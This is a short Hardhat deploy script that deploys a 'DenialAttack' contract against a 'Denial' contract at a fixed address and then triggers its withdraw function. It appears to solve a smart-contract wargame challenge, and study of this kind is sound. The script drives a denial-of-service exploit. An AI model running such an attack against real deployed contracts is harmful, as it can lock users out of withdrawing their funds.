import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { DenialAttack__factory, Denial__factory } from '../../typechain-types';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const denialAddress = "0x90a5256bB048090Ac542c84Dfc6c08e626F18E1B";

    console.log(">>Deploy DenialAttack Contract");
    const DenialAttack = await ethers.getContractFactory("DenialAttack", (await ethers.getSigners())[0]) as DenialAttack__factory;
    const denialAttack = await DenialAttack.deploy(denialAddress);
    await denialAttack.deployed();

    console.log(">>Attach Denial Contract");
    const Denial = await ethers.getContractFactory("Denial", (await ethers.getSigners())[0]) as Denial__factory;
    const denial = Denial.attach(denialAddress);
    console.log(">>>>Denial withdraw");
    try{
        const withoutResult = await denial.withdraw();
        await withoutResult.wait();
    }catch(error) {
        console.log(">>>> error:"+error);
    }

    console.log("✅ done");
}

export default func;
func.tags = ['Denial'];